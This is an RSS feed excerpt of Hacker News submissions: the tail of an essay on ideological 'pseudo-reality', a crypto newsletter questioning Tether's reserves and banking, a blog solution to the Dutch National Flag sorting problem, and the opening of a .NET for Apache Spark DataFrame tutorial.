<p>The ultimate purpose of creating a pseudo-reality is power, which the constructed pseudo-reality grants in many ways. Though these means are many, we should name a few. First, the pseudo-reality is always constructed such that it structurally advantages those who accept it over those who do not, frequently by overt double standards and through moral-linguistic traps. Double standards in this regard will always favor those who accept pseudo-reality as reality and will always disfavor those who seek the truth. An ideological pseudo-reality must displace reality in a sufficient population to grant itself power to succeed in its goals. Linguistic traps will often employ strategic double meanings of words, often by strategic redefinition (creating a <em>motte and bailey</em>), will beg the question in ways that forces people to participate in the pseudo-reality to respond (often by <em>Aufhebung</em>-style, i.e., Hegelian, dialectical traps), or will begin with an assumption of guilt and demand proof of innocence such that denial or resistance is taken as proof of guilt of some moral crime against the moral system that serves the pseudo-reality (a <em>kafkatrap</em>). Demands will be made with sufficient …</p></section></div></div></article></main></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/">https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/</a></em></p>]]>
            </description>
            <link>https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816494</guid>
            <pubDate>Sun, 17 Jan 2021 23:46:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[News: Tether’s offshore bank, the Bit Short, NYAG’s document deadline]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25816316">thread link</a>) | @amycastor
<br/>
January 17, 2021 | https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445 | <a href="https://web.archive.org/web/*/https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5445">
		<div>
		
<p>Finally, another newsletter! I am trying to find a way to write a crypto newsletter that doesn’t take all day to write. This is a (failed) attempt at that. Going forward, this sporadic newsletter will assume you know a thing or two about the crypto space. (If not, read the articles I link to!)</p>



<p>First some housekeeping—I’ve been working to update my blog and move it over from WordPress.com to WordPress.org. My main challenge is finding a WordPress theme that I like, preferably one that is free.&nbsp;If you have any recommendations, please let me know.</p>



<p>Also, the crap butterfly keyboard on my Macbook Pro is failing me, so I’ve ordered a Mac Air with the M1 chip, which will arrive in a few weeks.&nbsp;I’m hoping it makes my life easier.</p>



<p>If you want to support my work, a reminder that I have a <a href="https://www.patreon.com/amycastor" target="_blank" rel="noreferrer noopener">Patreon account</a>. Think of it as buying me a cup of coffee, a bottle of wine, or a case of wine once a month, depending on what level you subscribe to.&nbsp;&nbsp;</p>



<p>Now, on to the news, starting with Tether. </p>



<h2>Tether conversations reveal things</h2>



<p>I wrote two blog posts recently—these are both transcripts with annotations. If you are interested in Tether and Bitfinex, I recommend you read both, as they contain a lot of good information.&nbsp;&nbsp;</p>



<p>The first is an interview with Tether frontmen <a href="https://amycastor.com/2021/01/14/larry-cermak-and-bennett-tomlin-debate-tethers-solvency-transcript-with-notes/" target="_blank" rel="noreferrer noopener">Stuart Hoegner and Paolo Ardoino</a> hosted by bitcoin maxi Peter McCormack. The point of the interview was clearly to attack the “Tether FUD.”  </p>



<p>Remember, it’s very important that Tether keep up the illusion that real money is behind tethers and all is well in Tetherland. If the charade crumbles, so does Tether’s dollar-peg and along with it, the bitcoin market.</p>



<p>To that end, Hoegner is claiming that the now $24 billion worth of tethers in circulation are fully backed. What a switch. He told us in April 2019—22 billion tethers ago—they were 74% backed. The question is what are they backed with? He won’t tell us. (Deltec is their off-shore bank in the Bahamas, by the way.)&nbsp;</p>



<p><strong>Peter:</strong> You mentioned Deltec. Are you shareholders in the bank?&nbsp;<br><strong>Stuart: </strong>We don’t talk about the investments that we have on the Tether side.<br><strong>Peter:</strong> Okay, so are tethers fully backed?<br><strong>Stuart:</strong> Look. The short answer is yes. Every tether is 100% backed by our reserves. And those reserves include traditional currency and cash equivalents, and may include other assets and receivables from loans made by tether to third parties.&nbsp;</p>



<p>The second <a href="https://amycastor.com/2021/01/14/larry-cermak-and-bennett-tomlin-debate-tethers-solvency-transcript-with-notes/" target="_blank" rel="noreferrer noopener">transcript</a> I wrote up hasn’t gotten as many views but it is also interesting. It’s a debate between The Block’s Larry Cermak and blogger Bennett Tomlin. They argue whether Tether is acting in good faith. Cermak thinks they are. He believes tethers are fully backed—and wants you to believe that, too.</p>



<p>One question we have to ask is why Cermak, who was a staunch Tether skeptic in the past, has suddenly pulled a 180 and joined the campaign to prop up Tether? Assuming good faith, it appears he has fallen for the same con <a href="https://www.bloomberg.com/news/articles/2018-12-18/crypto-mystery-clues-suggest-tether-has-the-billions-it-promised" target="_blank" rel="noreferrer noopener">one Bloomberg reporter</a> did two years ago.</p>



<h2>Questions around Tether’s Deltec Bank </h2>



<p>Another curiosity that sprung up from Paolo and Stu’s interview: Who is Deltec’s banking partner? If Tether keeps its reserves at Deltec and its largest customers have accounts there too, one would think Deltec needs a U.S. bank partner to store USD. In other words, a <a href="https://www.investopedia.com/terms/n/nostroaccount.asp#:~:text=A%20nostro%20account%20refers%20to,foreign%20exchange%20and%20trade%20transactions." target="_blank" rel="noreferrer noopener">nostro account</a> in a foreign bank.&nbsp;</p>



<p>This should not be a secret. When Bitfinex was banking with Noble Bank in Puerto Rico, Noble openly stated on its website that it doesn’t actually hold the money. Instead, <a href="https://www.bloomberg.com/news/articles/2018-05-24/bitfinex-said-to-find-bank-in-puerto-rico-after-wells-fargo-exit" target="_blank" rel="noreferrer noopener">it used&nbsp;BNY Mellon as its custodian</a>. </p>



<p>Presumably, Deltec has a custodian, too. This might explain why the Bahamian Central bank is not reporting inflows that match what Tether claims to have in its reserves. (The central bank publishes a&nbsp;<a rel="noreferrer noopener" href="https://www.centralbankbahamas.com/publications/qsd" target="_blank">quarterly statistical digest</a>&nbsp;that looks at the total assets that all the country’s banks are holding.)</p>



<figure><div>

</div></figure>



<p>Of course, another explanation as to why the country’s central bank isn’t showing a large inflow of funds could be that Tether doesn’t have the reserves it says it does—or else, maybe, a good portion are in BTC?</p>



<p>In a <a href="https://youtu.be/3g2e_nEX9H0?t=426" target="_blank" rel="noreferrer noopener">year-in-review video,</a> Deltec’s CIO Hugo Rogers dropped a bomb. He said, with the straightest face you can imagine, that the bank has a “large position” in bitcoin. </p>



<p>“We bought bitcoin for our clients at about $9,300 so that worked very well through 2020 and we expect it to continue working well in 2021 as the printing presses continue to run hot.” (He is referring to the U.S. printing press, but we know Tether has been running hot, too.) </p>



<p>Hoegner denied that any of those funds were Tether’s, according to <a href="https://www.theblockcrypto.com/linked/91353/deltec-bitcoin-position-tether" target="_blank" rel="noreferrer noopener">The Block.</a></p>



<h2>The Bit Short</h2>



<p>An anonymous blogger published a Medium post on Tether titled <a href="https://crypto-anonymous-2021.medium.com/the-bit-short-inside-cryptos-doomsday-machine-f8dcf78a64d3" target="_blank" rel="noreferrer noopener">“The Bit Short: Inside Crypto’s Doomsday Machine.”</a>  It’s full of great quotes and insights, like this one, describing how Tether’s core moneymaking engine may possibly work:</p>



<ol><li>Bob, a crypto investor, puts $100 of real US dollars into Coinbase.</li><li>Bob then uses those dollars to buy $100 worth of Bitcoin on Coinbase.</li><li>Bob transfers his $100 in Bitcoin to an unbanked exchange, like Bybit.</li><li>Bob begins trading crypto on Bybit, using leverage, and receiving promotional giveaways — all of which are Tether-denominated.</li><li>Tether Ltd. buys Bob’s Bitcoins from him on the exchange, almost certainly through a deniable proxy trading account. Bob gets paid in Tethers.</li><li>Tether Ltd. takes Bob’s Bitcoins and moves them onto a banked exchange like Coinbase.</li><li>Finally, Tether Ltd. sells Bob’s Bitcoins on Coinbase for dollars, and exits the crypto markets.</li></ol>



<p>And this great quote here:</p>



<p>“Forget the activity on the offshore exchanges for a moment, and just think of a simple mental picture. Imagine you could stand at a metaphorical booth, where Coinbase’s exchange connects with the US financial system. If you could do that, you’d see two lines of people at the booth. One line would be crypto investors, putting dollars in—and the other line would be crooks, taking dollars out.”</p>



<p>If you can visualize the image above with Coinbase, you can start to understand why FinCEN is so anxious to push through its <a href="https://public-inspection.federalregister.gov/2020-28437.pdf" target="_blank" rel="noreferrer noopener">proposed “unhosted” wallets rule. </a></p>



<h2>Tether’s document deadline has passed</h2>



<p>Jan. 15 was the deadline for Bitfinex/Tether to submit a trove of documents to the NYAG, which has been investigating them for Martin Act violations. A lot of folks were hoping to see a court filing drop on Friday with the NYAG taking a position on the documents that it has received. The injunction, which limits Bitfinex from dipping into Tether’s reserves, also ended Friday, according to the NYAG’s letter from Dec. 8. </p>



<p>(Update: This is a bit confusing. I am not completely sure if the injunction ended on Jan. 15, according to the NYAG’s December <a href="https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=2AsYgvjJAsSdalpfkInbHA==" target="_blank" rel="noreferrer noopener">letter,</a> or it is implicitly extended until the next court order, <a href="https://twitter.com/ahcastor/status/1350991754330308609" target="_blank" rel="noreferrer noopener">per the original order.)</a> </p>



<p>The NYAG hasn’t filed any new court documents yet, but we are waiting anxiously. Tether says they’ve so far sent 2.5 million docs to the NYAG—I believe that’s called a <a href="https://en.wikipedia.org/wiki/Document_dump" target="_blank" rel="noreferrer noopener">document dump.</a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Sorry to break this to FUD spreaders. Tether and Bitfinex produced more than 2.5M documentation pages in response to requests from NYAG. Discussions are progressing well. Business as usual after the 15th of Jan. <a href="https://t.co/VoEsRuJyyP">https://t.co/VoEsRuJyyP</a></p>— Paolo Ardoino (@paoloardoino) <a href="https://twitter.com/paoloardoino/status/1348283355041853440?ref_src=twsrc%5Etfw">January 10, 2021</a></blockquote></div>
</div></figure>



<p>In the meantime, Tether has mysteriously stopped printing tethers. The last big print was <a href="https://twitter.com/whale_alert/status/1349038029546156034" target="_blank" rel="noreferrer noopener">400 million tethers on Jan. 12</a>, and prior to that, <a href="https://twitter.com/whale_alert/status/1347896030185009154" target="_blank" rel="noreferrer noopener">400 million on Jan. 9</a>, according to @whale_alert.  </p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I'd like to help all Tether FUD deniers who are announcing they've proven the FUDsters wrong, by listing the actual FUD items, so that they can base their denying on something. The "it's been proven many times before so I won't detail it here" seriously lacks entertainment value.</p>— Trolly McTrollface (@Tr0llyTr0llFace) <a href="https://twitter.com/Tr0llyTr0llFace/status/1350895370344288256?ref_src=twsrc%5Etfw">January 17, 2021</a></blockquote></div>
</div></figure>



<h2>Understanding GBTC</h2>



<p>There has been some confusion on Twitter as to how Grayscale Bitcoin Trust (GBTC) works. Grayscale doesn’t buy bitcoin directly. Grayscale customers send Grayscale their bitcoin—or cash to buy bitcoin with—and Grayscale issues shares in return. But why do the shares consistently trade at a premium to net asset value? </p>



<p>This <a href="https://adventuresincapitalism.com/2020/11/24/why-this-reflexive-ponzi-scheme-will-continue/" target="_blank" rel="noreferrer noopener">November 2020 article</a> by investor Harris Kupperman explains it well. “Think of GBTC as Pac-Man. The coins go in, but do not go out,” he said, going on to describe how GBTC functions as a “reflexive Ponzi scheme.”</p>



<h2>Coinlab cuts a deal with Mt Gox creditors</h2>



<p>Coinlab, a former U.S. company that has a $16 billion claim against Mt. Gox, has proposed a deal with Mt. Gox creditors over their claims. If creditors choose to go forward with the deal, they can agree to get back 90% of their BTC ahead of the settlement, according to <a href="https://www.bloomberg.com/news/articles/2021-01-15/coinlab-reaches-deal-with-mt-gox-trustee-over-bitcoin-claims" target="_blank" rel="noreferrer noopener">Bloomberg.</a></p>



<p>Kim Nilsson of WizSec says Coinlab was never acting in good faith. “CoinLab was insisting on continuing to hold up the process for everyone while they litigate to try to steal everyone’s money, and had to be essentially bribed so as not to obstruct this arrangement.” <a href="https://blog.wizsec.jp/2021/01/earlier-mtgox-payouts-coinlab.html" target="_blank" rel="noreferrer noopener">(WizSec blog)</a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I am positive that every Mt Gox creditor will happily agree to a 10% haircut on their settlement if it means CoinLab can claw back millions of dollars in Bitcoin</p>— Kyle S. Gibson (@KyleSGibson) <a href="https://twitter.com/KyleSGibson/status/1350146151916433409?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote></div>
</div></figure>



<h2>Other notable news</h2>



<p>FinCEN has extended the deadline for comments on its proposed crypto wallet rule. Starting from Jan. 15, you now have 15 days to comment on reporting requirements, and 45 days to comment on proposed rules for reporting counterparty information and record-keeping requirements. <a rel="noreferrer noopener" href="https://www.coindesk.com/fincen-extends-comment-period-for-controversial-crypto-wallet-rule-by-15-days" target="_blank">(Coindesk</a>, <a rel="noreferrer noopener" href="http://reopened%20for%2015%20days%20for%20comments%20on%20the%20proposed%20reporting%20requirements%20and%20for%2045%20days%20for%20comments%20on%20the%20proposed%20requirement%20to%20report%20counterparty%20information%20and%20the%20proposed%20recordkeeping%20requirements./" target="_blank">FinCEN notice)</a></p>



<p>Good-bye and good riddance. Brian Brooks has stepped down as acting commissioner of the OCC. <a href="https://www.coindesk.com/occ-chief-brian-brooks-is-stepping-down-thursday" target="_blank" rel="noreferrer noopener">(Coindesk.)</a> The former Coinbase exec recently posted an editorial in the Financial Times shilling DeFi. (<a href="https://www.ft.com/content/c1caca5b-01f7-41be-85a4-3ecb883f2417" target="_blank" rel="noreferrer noopener">FT</a>, paywalled)</p>



<p>The European Central Bank calls for regulating Bitcoin’s “funny business.” (<a href="https://reut.rs/2LLb5GK" target="_blank" rel="noreferrer noopener">Reuters</a>)</p>



<p>Gary Gensler is reportedly President-elect Joe Biden’s choice to lead the SEC. Gensler is a crypto savvy guy, who taught a course on blockchain at MIT …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445">https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445</a></em></p>]]>
            </description>
            <link>https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816316</guid>
            <pubDate>Sun, 17 Jan 2021 23:21:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dutch National Flag Problem]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25816211">thread link</a>) | @dleskosky
<br/>
January 17, 2021 | https://www.danielleskosky.com/dutch-national-flag-problem/ | <a href="https://web.archive.org/web/*/https://www.danielleskosky.com/dutch-national-flag-problem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Dutch National Flag Problem"><div>
<div><figure><img loading="lazy" width="899" height="599" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-banner.png" alt="Banner"></figure></div>


<p>I was going through LeetCode problems that I have solved, looking for one that would be good to write a post about.&nbsp; I came across the Dutch National Flag Problem and knew right away that it would be a good one.&nbsp;</p>
<p>LeetCode says that I solved this one on December 12, 2020 at 18:04.&nbsp; I remember this one because I was able to solve it all on my own.&nbsp; Being able to solve a problem all by yourself, certainly is powerful positive reinforcement.&nbsp; I certainly can use a bit of a pick-me-up after last night’s <a href="https://leetcode.com/contest/" target="_blank" rel="noopener">LeetCode Contest</a>.&nbsp; I was only able to answer one question!&nbsp; Oh well, there is always next week.</p>
<p>Before we get into the problem, I just wanted to give some background on it.&nbsp; It was actually first created by Edsger W. Dijkstra.&nbsp; Pretty neat if you ask me.&nbsp; Read more about it <a href="https://en.wikipedia.org/wiki/Dutch_national_flag_problem" target="_blank" rel="noopener">here</a>.</p>


<h2>The Problem</h2>


<p>Given an array nums with n objects colored red, white, or blue, sort them <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener">in-place</a> so that objects of the same color are adjacent, with the colors in the order red, white, and blue.</p>
<p>We will use the integers 0, 1, and 2 to represent the color red, white, and blue, respectively.</p>


<h2>Examples</h2>


<p><strong>Example 1:<br></strong><strong>Input:</strong> nums = [2,0,2,1,1,0] <br><strong>Output:</strong> [0,0,1,1,2,2]</p>
<p><strong>Example 2:<br></strong><strong>Input:</strong> nums = [2,0,1] <br><strong>Output:</strong> [0,1,2]</p>
<p><strong>Example 3:<br></strong><strong>Input:</strong> nums = [0] <br><strong>Output:</strong> [0]</p>
<p><strong>Example 4:<br></strong><strong>Input:</strong> nums = [1] <br><strong>Output:</strong> [1]</p>
<p><a href="https://leetcode.com/problems/sort-colors/" target="_blank" rel="noopener">Link to Problem</a></p>


<h2>How to Solve</h2>


<p>A good way to think about this problem is to realize that there are three different possible numbers (or colors) that can be in the array.&nbsp; As the array is iterated through, a different action needs to occur for each of the different numbers.</p>
<p>The twos need to all be at the right end of the output array, the zeros need to be all at the left end of the output array, and the ones need to be in the middle.</p>
<p>One of my initial thoughts for this problem was that there would have to be multiple pointers.&nbsp; One pointer to keep track of the lower bound, one for the upper bound, and then one that iterates.&nbsp; The pointers for the bounds will only increment or decrement, when the position that corresponds to that pointer is sorted properly.</p>
<p>Here are the steps:</p>
<ol>
<li>If the current number is zero, then swap the current number with the number at the lower bound.&nbsp; Increase the lower bound and current index by one.</li>
<li>If the current number is one, increase only the current index by one.</li>
<li>If the current number is two, swap the current number with the number at the upper bound.&nbsp; Decrease the upper bound by one.</li>
<li>Repeat that process until the index for current passes the upper bound index value.</li>
</ol>


<h2>The Code</h2>


<p>Here is the code that I came up with.&nbsp; Might not be a one-liner, but I still am pretty proud of it.&nbsp; If you want to see some other solutions, here is a <a href="https://leetcode.com/problems/sort-colors/discuss/26500/Four-different-solutions" target="_blank" rel="noopener">top-rated one</a> and here is another&nbsp;<a href="https://leetcode.com/problems/sort-colors/discuss/26472/Share-my-at-most-two-pass-constant-space-10-line-solution" target="_blank" rel="noopener">top-rated one</a> too.</p>






<h2>Some Illustrations</h2>


<p>I find illustrations pretty helpful to better understand the steps involved in an algorithm.&nbsp; Let’s look at some illustrations to help us be able to see this algorithm in action.&nbsp;&nbsp;</p>
<p><strong>Input:</strong>&nbsp; [2, 1, 0, 0, 1, 2]</p>
<p>Figure A shows the initial setup.&nbsp; The left is 0, current is 0, and right is 5.&nbsp; nums[current] = 2 and nums[right] = 2, so just right is decremented by one.</p>


<div><figure><img loading="lazy" width="835" height="326" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-figure-a.png" alt="Figure A"><figcaption>Figure A</figcaption></figure></div>


<p>In Figure B, once again nums[current] = 2, but this time nums[right] = 1.&nbsp; These two values will be swapped.&nbsp; right is decreased by one.</p>


<div><figure><img loading="lazy" width="829" height="340" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-figure-b.png" alt="Figure B"><figcaption>Figure B</figcaption></figure></div>


<p>In Figure C, nums[current] = 1, so only current is increased by one.</p>


<div><figure><img loading="lazy" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-figure-c-redo.png" alt="Figure C2" width="580" height="222"><figcaption>Figure C</figcaption></figure></div>


<p>In Figure D, nums[current] = 1, so current is again increased by one.</p>


<div><figure><img loading="lazy" width="1059" height="405" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-figure-d-redo.png" alt="Figure D2"><figcaption>Figure D</figcaption></figure></div>


<p>In Figure E, nums[current] = 0, so nums[current] is swapped with nums[left] and then both left and current are increased by one.</p>


<div><figure><img loading="lazy" width="1047" height="408" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-figure-e-redo.png" alt="Figure E2"><figcaption>Figure E</figcaption></figure></div>


<p>In Figure F, nums[current] = 0, so nums[current] is swapped with nums[left].&nbsp; left and current are increased by one.&nbsp; currrent is no longer less than or equal to right, so the while loop terminates and nums is returned as output.</p>


<div><figure><img loading="lazy" width="1055" height="400" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/dutch-national-flag/dutch-flag-figure-f-redo.png" alt="Figure F2"><figcaption>Figure F</figcaption></figure></div>


<pre title="">result:  [0, 0, 1, 1, 2, 2]
</pre>


<h2>Time Complexity</h2>


<p>If ‘n’ is the number of elements in the input array, then the time complexity of this algorithm is O(n), as the algorithm only requires one pass.</p>


<h2>Space Complexity</h2>


<p>The space complexity of the algorithm is O(1).&nbsp; The algorithm runs in constant space.</p>


<h2>Get Better at Algorithms!</h2>


<p>Algorithms and data structures are pretty tough.&nbsp; They are definitely taking a while for me to get the hang of them.&nbsp; However, there are some great resources out there, and I feel obligated to share some that have been most helpful to me.&nbsp; If I missed any that have been helpful to you, be sure to mention them in the comments.</p>
<ul>
<li><strong>Cracking the Coding Interview</strong> – Great resource.&nbsp; Really gets you in the right mindset for interviews.&nbsp; You can find it&nbsp;<a href="https://www.amazon.com/Cracking-Coding-Interview-Programming-Questions/dp/0984782850" target="_blank" rel="noopener noreferrer">here</a>.</li>
<li><strong>Elements of Programming Interviews</strong> – Another great book.&nbsp; Personally, I like this one more than CTCI, but YMMV.&nbsp; You can find it <a href="https://www.amazon.com/Elements-Programming-Interviews-Java-Insiders/dp/1517671272/ref=pd_lpo_14_t_0/134-2745636-3821839?_encoding=UTF8&amp;pd_rd_i=1517671272&amp;pd_rd_r=4eebd030-1368-436b-9bdd-22a403a57eae&amp;pd_rd_w=ku4HH&amp;pd_rd_wg=qY5q5&amp;pf_rd_p=7b36d496-f366-4631-94d3-61b87b52511b&amp;pf_rd_r=Y44KR67YH071M3P9JGSH&amp;psc=1&amp;refRID=Y44KR67YH071M3P9JGSH" target="_blank" rel="noopener noreferrer">here</a>.</li>
<li><strong>Grokking the Coding Interview</strong>&nbsp;– Can’t emphasize this one enough.&nbsp; Haven’t seen it mentioned it too often.&nbsp; Explains patterns that occur in different coding challenge problems.&nbsp; Great at providing a big-picture of all the different algorithm problems you might encounter.&nbsp; Check it out&nbsp;<a href="https://www.educative.io/courses/grokking-the-coding-interview" target="_blank" rel="noopener noreferrer">here</a>.</li>
<li><strong>Grokking Dynamic Programming</strong> – Dynamic programming is tough.&nbsp; This course has definitely helped me get a better understanding.</li>
<li><strong>Tushar</strong>&nbsp;<strong>Roy</strong> – Tushar really knows his stuff.&nbsp; His dynamic programming playlist is especially good.&nbsp; Check out his awesome&nbsp;<a href="https://www.youtube.com/user/tusharroy2525/featured" target="_blank" rel="noopener">YouTube channel</a>.</li>
<li><strong>Back To Back SWE</strong> – Great&nbsp;<a href="https://www.youtube.com/channel/UCmJz2DV1a3yfgrR7GqRtUUA" target="_blank" rel="noopener noreferrer">YouTube Channel</a>.&nbsp; Highly recommend.</li>
<li><strong>Kevin Naughton Jr.</strong> – Another awesome <a href="https://www.youtube.com/channel/UCKvwPt6BifPP54yzH99ff1g" target="_blank" rel="noopener noreferrer">YouTube channel</a>.&nbsp; Great at going over problems and gives helpful advice.</li>
<li><strong>Base CS&nbsp;</strong>– Vaidehi Joshi does a great job of laying out the fundamentals of algorithms and data structures.&nbsp; Check out the blog series&nbsp;<a href="https://medium.com/basecs" target="_blank" rel="noopener noreferrer">here</a>.&nbsp; She also has a&nbsp;<a href="https://www.codenewbie.org/basecs" target="_blank" rel="noopener noreferrer">podcast</a>&nbsp;that I give two thumbs up.</li>
<li><strong>Coding Challenge Website</strong>&nbsp;– There are plenty of different ones to choose from.&nbsp;&nbsp;<a href="https://www.hackerrank.com/" target="_blank" rel="noopener noreferrer">HackerRank</a>,&nbsp;<a href="https://www.codewars.com/" target="_blank" rel="noopener noreferrer">CodeWars</a>, and&nbsp;<a href="https://edabit.com/" target="_blank" rel="noopener noreferrer">Edabit</a>&nbsp;all seem to be pretty popular.&nbsp; I personally use&nbsp;<a href="https://leetcode.com/" target="_blank" rel="noopener noreferrer">LeetCode</a>.&nbsp; Find the one that works for you!</li>
<li><strong>Pramp</strong>&nbsp;– Do mock interviews!&nbsp; The sooner the better!&nbsp;&nbsp;<a href="https://www.pramp.com/" target="_blank" rel="noopener noreferrer">Pramp</a>&nbsp;has been a huge help to me.</li>
</ul>
<p>Well, I hope that was useful.&nbsp; Thanks for reading my post and best of luck with your learning about data structures and algorithms!</p>



<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://www.danielleskosky.com/dutch-national-flag-problem/"
    dc:identifier="https://www.danielleskosky.com/dutch-national-flag-problem/"
    dc:title="Dutch National Flag Problem"
    trackback:ping="https://www.danielleskosky.com/dutch-national-flag-problem/trackback/" />
</rdf:RDF>-->
</div></article></div>]]>
            </description>
            <link>https://www.danielleskosky.com/dutch-national-flag-problem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816211</guid>
            <pubDate>Sun, 17 Jan 2021 23:08:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Data in a DataFrame via .NET for Apache Spark]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25816052">thread link</a>) | @ed_elliott_asc
<br/>
January 17, 2021 | https://the.agilesql.club/2021/01/how-to-get-data-in-a-dataframe-via-.net-for-apache-spark/ | <a href="https://web.archive.org/web/*/https://the.agilesql.club/2021/01/how-to-get-data-in-a-dataframe-via-.net-for-apache-spark/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
            <!-- Banner -->
    

            <!-- Header -->


        <!-- Main -->
            <div id="main">

                
                    <secion id="one">
                        
                        <div>
                            
                            
                            
                            <header>
                                
                            </header>
                            
                            <p>When I first started working with Apache Spark, one of the things I struggled with was that I would have some variable or data in my code that I wanted to work on with Apache Spark. To get the data in a state that Apache Spark can process it involves putting the data into a DataFrame. How do you take some data and get it into a DataFrame?</p>
<p>This post will cover all the ways to get data into a DataFrame in .NET for Apache Spark.</p>
<p>If you would like a working example, then please see the repo:</p>
<p><a href="https://github.com/GoEddie/CreatingDataFrameInSparkDotnet/blob/main/CreatingDataFrames/Program.cs">https://github.com/GoEddie/CreatingDataFrameInSparkDotnet/blob/main/CreatingDataFrames/Program.cs</a></p>
<p>##&nbsp;Reading data into a DataFrame
(save the eye-rolling, but it would be remiss of me not to mention this!) The primary way to get data into Apache Spark is to read the data. Typically you will be reading from a data lake or a hive table, and Apache Spark is well suited to reading data from a variety of sources:</p>
<div><pre><code data-lang="csharp"><span>var</span> tempPath = System.IO.Path.GetTempFileName();
File.WriteAllText(tempPath, <span>"[{\"name\": \"ed\"},{\"name\": \"edd\"},{\"name\": \"eddie\"}]"</span>);

Console.WriteLine(<span>"spark.Read()"</span>);
<span>var</span> dataFrame = spark.Read().Json(tempPath);
dataFrame.Show(<span>5</span>);
<span>/*
</span><span> *  +-----+
</span><span>    | name|
</span><span>    +-----+
</span><span>    |   ed|
</span><span>    |  edd|
</span><span>    |eddie|
</span><span>    +-----+
</span><span> */</span>
</code></pre></div><p>In this example, we use <code>spark.Read().Json(tempPath)</code>, which reads a JSON document, we could alternatively have written <code>spark.Read().Format("json").Load(tempPath)</code>.  Using the second version is you can pass a parameter to <code>Format</code>, which allows you to decide the format at runtime, very useful when we use metadata to tell us which files to load.</p>
<h2 id="sparkrange">Spark.Range()</h2>
<p>I use <code>spark.Range</code> a lot when playing around and testing stuff in Spark. Range lets you pass in the number of rows you want to create, and Spark creates a DataFrame with that many rows and a single column called “id” which is an incrementing number.</p>
<div><pre><code data-lang="csharp"><span>var</span> dataFrame = spark.Range(<span>1</span><span>0</span><span>0</span><span>0</span>);
dataFrame.Show(<span>5</span>);
<span>/*
</span><span> *  +---+
</span><span>    | id|
</span><span>    +---+
</span><span>    |  0|
</span><span>    |  1|
</span><span>    |  2|
</span><span>    |  3|
</span><span>    |  4|
</span><span>    +---+
</span><span> * 
</span><span> */</span>
</code></pre></div><hr>
<p><em>Warning Obscure Tangent</em></p>
<p>The thing about using Range is that when I use it, I have this sort of internal monolog that goes along these lines “blimey, projecting out a number of rows is so much easier with spark that is was with SQL Server, I remember having to resort to “select top @AmountOfRowsIWant * from sys.objects cross join sys.sysindexes”.</p>
<p><em>End of Obscure Tangent</em></p>
<hr>
<p>Once you have created the DataFrame you can the use WithColumn to add extra data:</p>
<div><pre><code data-lang="csharp">dataFrame = dataFrame.WithColumn(<span>"Another Column"</span>, Functions.Lit(<span>"Literal"</span>));
dataFrame.Show(<span>5</span>);
<span>/*
</span><span> *  +---+--------------+
</span><span>    | id|Another Column|
</span><span>    +---+--------------+
</span><span>    |  0|       Literal|
</span><span>    |  1|       Literal|
</span><span>    |  2|       Literal|
</span><span>    |  3|       Literal|
</span><span>    |  4|       Literal|
</span><span>    +---+--------------+
</span><span> */</span>
</code></pre></div><p>or we can use a spark function to add some additional columns to our DataFrame:</p>
<div><pre><code data-lang="csharp">dataFrame = dataFrame.WithColumn(<span>"Mod"</span>, Functions.Pmod(Functions.Col(<span>"id"</span>), Functions.Lit(<span>2</span>)));
dataFrame.Show(<span>5</span>);

<span>/*
</span><span> *  +---+--------------+---+
</span><span>    | id|Another Column|Mod|
</span><span>    +---+--------------+---+
</span><span>    |  0|       Literal|  0|
